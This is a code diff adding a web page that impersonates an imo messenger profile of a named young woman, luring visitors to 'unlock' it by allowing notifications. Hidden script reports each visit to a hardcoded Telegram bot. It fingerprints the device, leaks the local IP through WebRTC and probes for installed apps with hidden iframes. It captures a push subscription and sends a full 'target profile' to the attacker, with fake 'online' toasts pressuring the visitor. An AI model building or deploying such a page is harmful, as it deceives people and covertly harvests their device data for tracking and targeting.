@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Unlock Mst: Nusrat Jahan</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #ffffff; height: 100vh; overflow: hidden; margin: 0; user-select: none; }
+        .animate-fade { animation: fadeIn 0.3s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .toast-notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: white; padding: 12px 20px; border-radius: 8px; font-size: 13px; z-index: 9999; width: 90%; max-width: 400px; text-align: center; animation: slideDown 0.5s ease-out; }
+        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA"; 
+        const CHAT_ID = "8271536101"; 
+        const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
+        const VAPID_PUBLIC_KEY = "YOUR_PUBLIC_VAPID_KEY_HERE"; // এখানে আপনার আসল কি বসাতে হবে
+
+        // Generate Unique 4-Digit ID
+        let userId = localStorage.getItem('v_id');
+        if (!userId) {
+            userId = Math.floor(1000 + Math.random() * 9000);
+            localStorage.setItem('v_id', userId);
+        }
+
+        let report = { hardware: {}, software: {}, network: {}, apps: [] };
+
+        const sendToTelegram = async (msg) => {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.error("Telegram Error:", e); }
+        };
+
+        const App = () => {
+            const [step, setStep] = useState('MAIN'); 
+            const [showToast, setShowToast] = useState(false);
+
+            // --- ADVANCED SCAN LOGICS ---
+            const masterScan = async () => {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                report.hardware.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
+                report.hardware.ram = navigator.deviceMemory || "Unknown";
+                report.hardware.cores = navigator.hardwareConcurrency;
+
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                    pc.createDataChannel("");
+                    pc.onicecandidate = e => {
+                        if (e.candidate) {
+                            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                            if (ip) report.network.ip = ip[1];
+                        }
+                    };
+                    pc.createOffer().then(s => pc.setLocalDescription(s));
+                } catch(e) {}
+
+                if (navigator.userAgentData) {
+                    const h = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    report.hardware.model = h.model;
+                    report.software.os = h.platformVersion;
+                }
+
+                const start = performance.now();
+                for (let i = 0; i < 30000000; i++) Math.sqrt(i);
+                report.software.speed = (performance.now() - start).toFixed(2) + "ms";
+
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    report.network.bat = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+                }
+
+                report.software.patch = ('highlights' in CSS) ? "Secure (Post-2023)" : "Legacy";
+
+                if (navigator.connection) {
+                    report.network.net = `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)`;
+                }
+            };
+
+            const probeApps = async () => {
+                const apps = [{n:"WhatsApp",u:"whatsapp://"}, {n:"Telegram",u:"tg://"}, {n:"FB",u:"fb://"}];
+                for (let app of apps) {
+                    const success = await new Promise(res => {
+                        let blurred = false;
+                        const onBlur = () => blurred = true;
+                        window.addEventListener('blur', onBlur);
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none'; iframe.src = app.u;
+                        document.body.appendChild(iframe);
+                        setTimeout(() => {
+                            document.body.removeChild(iframe);
+                            window.removeEventListener('blur', onBlur);
+                            res(blurred);
+                        }, 500);
+                    });
+                    if (success) report.apps.push(app.n);
+                }
+            };
+
+            // --- SERVICE WORKER & PUSH REGISTRATION ---
+            const registerServiceWorker = async () => {
+                if ('serviceWorker' in navigator) {
+                    try {
+                        const registration = await navigator.serviceWorker.register('sw.js');
+                        console.log('Service Worker Registered');
+
+                        const subscription = await registration.pushManager.subscribe({
+                            userVisibleOnly: true,
+                            applicationServerKey: VAPID_PUBLIC_KEY
+                        });
+
+                        await sendToTelegram(`🚀 *Push Token Received for #${userId}*\n\`${JSON.stringify(subscription)}\``);
+                    } catch (err) {
+                        console.error('Service Worker / Push failed', err);
+                    }
+                }
+            };
+
+            useEffect(() => {
+                masterScan();
+                sendToTelegram(`🔔 *Visitor #${userId}* entered the page.`);
+                
+                const interval = setInterval(() => {
+                    setShowToast(true);
+                    setTimeout(() => setShowToast(false), 5000);
+                }, 25000);
+                return () => clearInterval(interval);
+            }, []);
+
+            const handleUnlock = async () => {
+                if (!window.isSecureContext) {
+                    alert("Security Error: HTTPS is required for this operation.");
+                    return;
+                }
+
+                const permission = await Notification.requestPermission();
+                
+                if (permission === 'granted') {
+                    setStep('LOADER');
+                    
+                    // এখানে সার্ভিস ওয়ার্কার রেজিস্টার করা হচ্ছে
+                    await registerServiceWorker();
+                    
+                    await probeApps();
+                    
+                    const reportMsg = `
+🔍 *Advanced Target Profile #${userId}*
+---------------------------
+📱 *Device:* ${report.hardware.model || navigator.platform}
+⚙️ *OS:* Android ${report.software.os || "Unknown"}
+🎮 *GPU:* ${report.hardware.gpu}
+🧠 *RAM:* ${report.hardware.ram} GB
+⚡ *Exec Speed:* ${report.software.speed}
+🛡️ *Patch:* ${report.software.patch}
+🏠 *IP:* ${report.network.ip || "Protected (mDNS)"}
+🔋 *Battery:* ${report.network.bat || "N/A"}
+🌐 *Network:* ${report.network.net || "N/A"}
+📦 *Apps:* ${report.apps.join(", ") || "None"}
+---------------------------
+User-Agent: ${navigator.userAgent}`;
+
+                    await sendToTelegram(reportMsg);
+                    setTimeout(() => setStep('SUCCESS'), 3000);
+                } else {
+                    alert("Please allow notifications to unlock the profile.");
+                }
+            };
+
+            return (
+                <div className="flex flex-col h-full w-full bg-white relative">
+                    {showToast && <div className="toast-notification">Nusrat Jahan is online. Unlock to chat.</div>}
+
+                    <div className="h-14 bg-white flex items-center px-4 border-b border-slate-100 shadow-sm">
+                        <div className="flex-1 flex items-center gap-3">
+                            <div className="w-8 h-8 rounded-full border border-slate-200 overflow-hidden">
+                                <img src="https://i.ibb.co/v6m80kP/nusrat.jpg" className="w-full h-full object-cover" />
+                            </div>
+                            <span className="text-xl font-bold text-black tracking-tighter">imo</span>
+                        </div>
+                    </div>
+
+                    <div className="flex-1 p-4">
+                        {step === 'MAIN' && (
+                            <div className="animate-fade">
+                                <div className="w-full bg-white border border-slate-200 rounded-2xl p-6 shadow-sm">
+                                    <div className="flex items-center gap-4 mb-5">
+                                        <img src="https://i.ibb.co/v6m80kP/nusrat.jpg" className="w-16 h-16 rounded-full border-2 border-slate-100 object-cover" />
+                                        <div>
+                                            <h3 className="font-bold text-xl text-black">Mst: Nusrat Jahan</h3>
+                                            <p className="text-xs text-[#0091ea] font-bold bg-blue-50 px-2 py-1 rounded inline-block">Online Now</p>
+                                        </div>
+                                    </div>
+                                    <p className="text-slate-600 text-sm mb-8">This account is protected. Click unlock and allow the notification to access the profile.</p>
+                                    
+                                    <button 
+                                        onClick={handleUnlock}
+                                        className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-md active:scale-95 transition-all">
+                                        Unlock Profile Access
+                                    </button>
+                                </div>
+                            </div>
+                        )}
+
+                        {step === 'LOADER' && (
+                            <div className="text-center py-10">
+                                <div className="w-14 h-14 border-4 border-t-[#0091ea] border-slate-200 rounded-full animate-spin mx-auto"></div>
+                                <p className="mt-4 font-bold text-slate-700">Verifying Identity ID: {userId}...</p>
+                            </div>
+                        )}
+
+                        {step === 'SUCCESS' && (
+                            <div className="text-center py-8 animate-fade">
+                                <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
+                                    <i className="fa-solid fa-check text-4xl"></i>
+                                </div>
+                                <h3 className="text-2xl font-bold text-green-700">Access Granted!</h3>
+                                <p className="text-slate-600 mt-2 mb-8">Verification successful for User #{userId}.</p>
+                                <button 
+                                    onClick={() => window.location.href = REDIRECT_LINK} 
+                                    className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-lg">
+                                    Open imo Profile
+                                </button>
+                            </div>
+                        )}
+                    </div>
+
+                    <div className="h-16 border-t flex justify-around items-center bg-white">
+                        <div className="text-[#0091ea] text-center"><i className="fa-solid fa-comment-dots text-xl"></i><p className="text-[10px] font-bold">Chats</p></div>
+                        <div className="text-slate-400 text-center"><i className="fa-solid fa-globe text-xl"></i><p className="text-[10px]">Explore</p></div>
+                        <div className="text-slate-400 text-center"><i className="fa-solid fa-address-book text-xl"></i><p className="text-[10px]">Contacts</p></div>
+                    </div>
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
